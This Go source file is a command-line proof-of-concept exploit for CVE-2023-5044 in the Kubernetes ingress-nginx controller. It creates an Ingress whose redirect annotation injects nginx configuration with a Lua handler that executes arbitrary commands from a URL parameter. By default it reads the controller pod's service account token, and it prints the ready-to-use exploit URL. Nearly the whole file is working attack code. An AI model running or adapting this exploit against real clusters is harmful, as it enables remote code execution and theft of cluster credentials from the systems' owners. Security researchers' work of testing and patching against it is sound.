package main

import (
	"context"
	"fmt"
	"log/slog"
	"net/url"
	"os"
	"time"

	"github.com/spf13/cobra"
	authorizationv1 "k8s.io/api/authorization/v1"
	networkingv1 "k8s.io/api/networking/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/cli-runtime/pkg/genericclioptions"
	"k8s.io/cli-runtime/pkg/genericiooptions"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/kubernetes/scheme"
)

type Options struct {
	ConfigFlags *genericclioptions.ConfigFlags
	PrintFlags  *genericclioptions.PrintFlags

	// The URL that the ingress can be targeted at after
	// it is deployed
	URL string

	// The prefix for the Ingress object name
	IngressObjectNamePrefix string

	// The path which will trigger the exploit
	RedirectPath string

	// CloseItOffPath is the path used to close off the exploit. There's no reason to
	// target this path but without it the nginx config will be invalid
	CloseItOffPath string

	// ExploitCommand is the command which will be executed on the ingress-nginx controller pod
	ExploitCommand string

	genericiooptions.IOStreams
}

func main() {
	o := &Options{
		ConfigFlags: genericclioptions.NewConfigFlags(true),
		PrintFlags:  genericclioptions.NewPrintFlags("").WithDefaultOutput("yaml").WithTypeSetter(scheme.Scheme),
		IOStreams:   genericclioptions.IOStreams{In: os.Stdin, Out: os.Stdout, ErrOut: os.Stderr},
	}

	cmd := &cobra.Command{
		Use:          "cve-2023-5044",
		Short:        "Exploit CVE-2023-5044",
		Long:         "Create an ingress object that exploits CVE-2023-5044",
		SilenceUsage: true,
		RunE: func(cmd *cobra.Command, args []string) error {
			return o.Run()
		},
	}

	cmd.Flags().StringVarP(&o.URL, "url", "u", "", "URL to exploit")
	cmd.Flags().StringVarP(&o.IngressObjectNamePrefix, "ingress-name", "i", "forearmed-poc-", "Prefix for the ingress object to create.")
	cmd.Flags().StringVarP(&o.RedirectPath, "redirect-path", "r", "4armed", "Path used for exploit.")
	cmd.Flags().StringVarP(&o.ExploitCommand, "execute", "e", "cat /var/run/secrets/kubernetes.io/serviceaccount/token", "Command to execute on the ingress-nginx controller pod.")
	o.ConfigFlags.AddFlags(cmd.Flags())
	o.PrintFlags.AddFlags(cmd)

	cmd.Execute()
}

func (o *Options) Run() error {
	if o.ConfigFlags.Namespace == nil || *o.ConfigFlags.Namespace == "" {
		ns := "default"
		o.ConfigFlags.Namespace = &ns
	}

	// Thank you Rory McCune for the steer - https://raesene.github.io/blog/2023/10/29/exploiting-CVE-2023-5044/
	exploitStr := fmt.Sprintf(`https://www.4armed.com;}location ~* "^/%s(/|$)(.*)" {content_by_lua 'ngx.say(io.popen(ngx.unescape_uri(ngx.var.arg_cmd)):read("*a"))';}location ~* "^/closeitoff" { return 404 'pwned'`, o.RedirectPath)

	annotations := map[string]string{
		"kubernetes.io/ingress.class":                    "nginx",
		"nginx.ingress.kubernetes.io/permanent-redirect": exploitStr,
	}

	pt := networkingv1.PathTypePrefix

	// Create an ingress object pointing at the Kubernetes service. This won't work unless you use HTTPS but it doesn't
	// matter. We don't need to use it, it just saves us having to deploy pod and service.
	i := &networkingv1.Ingress{
		TypeMeta: metav1.TypeMeta{
			Kind:       "Ingress",
			APIVersion: "networking.k8s.io/v1",
		},
		ObjectMeta: metav1.ObjectMeta{
			GenerateName: o.IngressObjectNamePrefix,
			Namespace:    *o.ConfigFlags.Namespace,
			Annotations:  annotations,
		},
		Spec: networkingv1.IngressSpec{
			Rules: []networkingv1.IngressRule{{
				IngressRuleValue: networkingv1.IngressRuleValue{
					HTTP: &networkingv1.HTTPIngressRuleValue{
						Paths: []networkingv1.HTTPIngressPath{{
							PathType: &pt,
							Path:     fmt.Sprintf("/doesnotmatter%d", time.Now().UnixNano()),
							Backend: networkingv1.IngressBackend{
								Service: &networkingv1.IngressServiceBackend{
									Name: "kubernetes",
									Port: networkingv1.ServiceBackendPort{
										Number: 443,
									},
								},
							},
						}},
					},
				},
			}},
		},
	}

	if o.PrintFlags.OutputFormat != nil {
		printer, err := o.PrintFlags.ToPrinter()
		if err != nil {
			return err
		}

		return printer.PrintObj(i, o.Out)
	}

	config, err := o.ConfigFlags.ToRESTConfig()
	if err != nil {
		return err
	}

	client, err := kubernetes.NewForConfig(config)
	if err != nil {
		return err
	}

	// Check that we can create an ingress
	sar := &authorizationv1.SelfSubjectAccessReview{
		Spec: authorizationv1.SelfSubjectAccessReviewSpec{
			ResourceAttributes: &authorizationv1.ResourceAttributes{
				Namespace: *o.ConfigFlags.Namespace,
				Verb:      "create",
				Resource:  "ingress",
			},
		},
	}

	slog.Info("checking permissions")
	response, err := client.AuthorizationV1().SelfSubjectAccessReviews().Create(context.TODO(), sar, metav1.CreateOptions{})
	if err != nil {
		return err
	}

	if !response.Status.Allowed {
		return fmt.Errorf("you do not have permission to create an ingress object: %v", response.Status.Reason)
	}

	ingress, err := client.NetworkingV1().Ingresses(*o.ConfigFlags.Namespace).Create(context.TODO(), i, metav1.CreateOptions{})
	if err != nil {
		return err
	}

	slog.Info("created ingress object", "namespace", ingress.ObjectMeta.Namespace, "name", ingress.ObjectMeta.Name)

	if o.URL != "" {
		slog.Info("exploit URL", "url", fmt.Sprintf("%s/%s?cmd=%s", o.URL, o.RedirectPath, url.QueryEscape(o.ExploitCommand)))
	}

	return nil
}
